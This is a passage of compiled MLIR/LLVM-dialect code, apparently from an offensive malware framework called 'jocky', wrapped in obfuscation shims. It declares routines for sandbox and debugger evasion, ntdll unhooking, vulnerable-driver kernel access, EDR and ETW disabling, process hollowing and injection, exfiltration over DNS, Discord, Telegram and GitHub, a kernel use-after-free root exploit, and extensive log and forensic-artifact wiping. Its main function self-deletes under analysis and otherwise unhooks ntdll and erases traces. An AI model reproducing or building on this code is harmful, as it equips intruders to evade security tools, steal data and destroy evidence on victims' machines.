    llvm.return
  }
  llvm.func internal @__obfs_wrap_malloc(%arg0: i64) -> !llvm.ptr {
    %0 = llvm.call @malloc(%arg0) : (i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_str_concat(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_str_concat(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_string(%arg0: i64) -> !llvm.ptr {
    %0 = llvm.call @string(%arg0) : (i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_println(%arg0: !llvm.ptr) {
    llvm.call @println(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_puts(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @puts(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_get_syscall_number(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_kread(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_kwrite(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_module_stomp(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_thread_hijack(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @forensics_wipe_powershell_history() -> i32
  llvm.func @forensics_wipe_cmd_history() -> i32
  llvm.func @forensics_flush_arp_cache() -> i32
  llvm.func @forensics_clear_dns_cache() -> i32
  llvm.func @linux_forensics_wipe_bash_history() -> i32
  llvm.func @jocky_linux_cleanup_syslog() -> i32
  llvm.func @jocky_linux_cleanup_journal() -> i32
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr) -> i32
  llvm.func @jocky_cleanup_usn_journal() -> i32
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @sandbox_set_limits(i32, i64, i32, i64) -> i1
  llvm.func @sandbox_monitor(i32) -> i32
  llvm.func @sandbox_wait(i32) -> i32
  llvm.func @sandbox_export_trace(i32, !llvm.ptr) -> i1
  llvm.func @jocky_registry_create_key(i32, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
  llvm.func @jocky_registry_close_key(!llvm.ptr) -> i1
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_init(i32) -> i1
  llvm.func @audit_export(!llvm.ptr) -> i1
  llvm.func @audit_verify() -> i32
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @ai_init() -> i32
  llvm.func @ai_collect_telemetry() -> !llvm.ptr
  llvm.func @ai_score_threat() -> f64
  llvm.func @byovd_load_driver(!llvm.ptr) -> i32
  llvm.func @byovd_test_exploit(i32) -> i32
  llvm.func @btr_disable_notifications() -> i1
  llvm.func @btr_mask_module(!llvm.ptr) -> i1
  llvm.func @jocky_exploit_disable_callbacks() -> i32
  llvm.func @jocky_exploit_token_replacement(i32, i32) -> i32
  llvm.func @edrhoker_detect() -> i1
  llvm.func @blindside_unhook_ntdll() -> i1
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_module_load(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_module_unload(!llvm.ptr) -> i1
  llvm.func @jocky_module_has_symbol(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_module_base(!llvm.ptr) -> i64
  llvm.func @jocky_module_resolve_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_process_hollow_linux(i32, !llvm.ptr, i64) -> i1
  llvm.func @jocky_process_ptrace_attach(i32) -> i32
  llvm.func @jocky_process_ptrace_detach(i32) -> i32
  llvm.func @jocky_process_get_maps(i32, !llvm.ptr, i64) -> i32
  llvm.func @jocky_fence2pwn_detect_kfence() -> i32
  llvm.func @jocky_fence2pwn_get_pool_info(!llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_trigger_allocations(i64, i32) -> i32
  llvm.func @jocky_fence2pwn_exploit_uaf(i32, i32, !llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_manipulate_creds(i32, i32) -> i32
  llvm.func @jocky_fence2pwn_allocate_cred_objects(i32) -> i32
  llvm.func @jocky_fence2pwn_write_cred(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_fence2pwn_trigger_reclamation() -> i32
  llvm.func @jocky_fence2pwn_elevate_to_root() -> i32
  llvm.func @jocky_fence2pwn_find_uaf_primitive() -> i32
  llvm.func @jocky_ebpf_load(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_ebpf_attach(i32, i32, i32) -> i32
  llvm.func @jocky_ebpf_run(i32, !llvm.ptr, i32) -> i64
  llvm.func @jocky_lkm_load(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_lkm_unload(!llvm.ptr) -> i32
  llvm.func @jocky_lkm_get_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_syscall_hook(i32, !llvm.ptr) -> i32
  llvm.func @jocky_syscall_unhook(i32) -> i32
  llvm.func @jocky_syscall_trace(i32) -> i32
  llvm.func @jocky_ftrace_attach(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_ftrace_detach(!llvm.ptr) -> i32
  llvm.func @main() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %3 = llvm.call @__obfs_wrap_jocky_check_analysis_environment() : () -> i32
    llvm.store %3, %2 {alignment = 4 : i64} : i32, !llvm.ptr
    %4 = llvm.load %2 {alignment = 4 : i64} : !llvm.ptr -> i32
    %5 = llvm.icmp "ne" %4, %1 : i32
    llvm.cond_br %5, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    llvm.call @__obfs_wrap_jocky_self_delete() : () -> ()
    llvm.return
  ^bb2:  // pred: ^bb0
    %6 = llvm.call @__obfs_wrap_jocky_unhook_ntdll() : () -> i1
    llvm.call @__obfs_wrap_jocky_cleanup_all() : () -> ()
    llvm.return
  }
}

